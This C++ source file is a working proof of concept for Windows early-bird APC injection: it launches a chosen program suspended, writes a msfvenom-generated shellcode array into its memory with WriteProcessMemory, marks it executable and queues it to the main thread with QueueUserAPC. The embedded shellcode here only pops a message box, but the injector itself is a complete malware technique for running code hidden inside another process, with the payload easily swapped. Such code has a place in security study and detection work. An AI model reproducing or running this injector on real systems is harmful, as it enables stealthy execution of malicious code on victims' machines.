/*
	DESC: Asynchronous Procedure Call (APC) Injection
	Author: Eric Chen / D1172271, 3/26/2024 7:55:58 PM
	Note: The cuurent shellcode it is injecting is having the EXITFUNC set to the
	process, causing the notepad to exit right after the APC task is invoked.
*/

#include <vector>
#include <iostream>
#include <windows.h>

// msfvenom messageboxa shellcode, EXITFUNC=process
std::vector<unsigned char> payload = {
0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7,
0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e,
0x4c, 0x8d, 0x85, 0x27, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff,
0xd5, 0x4a, 0x75, 0x73, 0x74, 0x20, 0x64, 0x61, 0x6e, 0x63, 0x65, 0x20, 0x77, 0x69,
0x74, 0x68, 0x20, 0x6d, 0x65, 0x20, 0x61, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x72, 0x6f,
0x75, 0x67, 0x68, 0x20, 0x74, 0x68, 0x65, 0x20, 0x6e, 0x69, 0x67, 0x68, 0x74, 0x00,
0x46, 0x45, 0x45, 0x4c, 0x20, 0x41, 0x4c, 0x4c, 0x20, 0x4e, 0x49, 0x47, 0x48, 0x54,
0x00,
};


// EP
int main(void) {
	DWORD old_protect{0};
	size_t bytes_written{0};
	std::wstring executable;
	PROCESS_INFORMATION pi{0};
	LPVOID memory_buffer{nullptr};
	STARTUPINFOW si{.cb = sizeof(STARTUPINFOW)};
	std::vector <wchar_t> executable_path(MAX_PATH, L'\0');

	// prompt for user input
	std::cout << "[INFO] Enter the name of the executable to inject: ";
	std::getline(std::wcin, executable);
		
	// checking the existence of the input executable
	std::wcout << "[INFO] Try retrieving the complete path of the specified executable ......" << std::endl;
	DWORD copied = SearchPathW(nullptr, executable.c_str(), nullptr, executable_path.size(), executable_path.data(), nullptr);
	if (copied == 0 || copied > executable_path.size()) {
		
		std::cout << "[ERROR] Failed to retrieve the full path of the specified executable !!" << std::endl;
		std::cin.get();
		return -1;
	}
	
	// trying to create an process instance of the specified exxecutable
	std::wcout << "[INFO] Creating process instance of \'" << executable_path.data() << "\' in CREATE_SUSPENDED state ......" << std::endl;
	if (!CreateProcessW(executable_path.data(), nullptr, nullptr, nullptr, false, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
		
		std::cerr << "[ERROR] Process creation failed for the specified executable !!" << std::endl;
		std::cin.get();
		return -1;
	}
	
	// allocate a memory region in the foreign process
	std::cout << "[INFO] Allocating memory space of " << payload.size() << "bytes in PID " << pi.dwProcessId << " ......" << std::endl;
	memory_buffer = VirtualAllocEx(pi.hProcess, nullptr, payload.size(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (memory_buffer == nullptr) {
		
		std::cerr << "[ERROR] Failed to reserve memory space in foreign process !!" << std::endl;
		std::cin.get();
		return -1; 
	}
	
	// write the shellcode into the foreign process memeory
	std::cout << "[INFO] Writing the shellcode to the foreign process's memory space ......" << std::endl;
	if (!WriteProcessMemory(pi.hProcess, memory_buffer, payload.data(), payload.size(), &bytes_written)) {
		
		std::cerr << "[ERROR] Failed writing shellcode to the allocated memory !!" << std::endl;
		std::cin.get();
		return -1;
	} else {
		
		std::cout << "[INFO] Written " << bytes_written << " bytes to allocated memory !!" << std::endl;
	}
	
	// update the memory protect attribute of the allocated buffer
	std::cout << "[INFO] Updating allocated memory buffer execution permission to X ......" << std::endl;
	if (!VirtualProtectEx(pi.hProcess, memory_buffer, payload.size(), PAGE_EXECUTE, &old_protect)) {
		
		std::cerr << "[ERROR] Failed to update the allocated memory's permission !!" << std::endl;
		std::cin.get();
		return -1;
	}
	
	// try to schedule an APC task for it in the queue
	std::cout << "[INFO] Adding an APC object to the APC queue of thread ID " << pi.dwThreadId << std::endl;
	if (!QueueUserAPC(reinterpret_cast<PAPCFUNC>(memory_buffer), pi.hThread, reinterpret_cast<ULONG_PTR>(nullptr))) {

		std::cerr << "[ERROR] Failed adding APC object to target thread's queue !!" << std::endl;
		std::cin.get();
		return -1;
	}
	
	// resume the process
	std::cout << "[INFO] Resuming the suspended process ......" << std::endl;
	ResumeThread(pi.hThread);
	
	// process exit
	std::cout << "[INFO] The process exitied gracefully !!" << std::endl;
	std::cin.get();
	return 0;
} 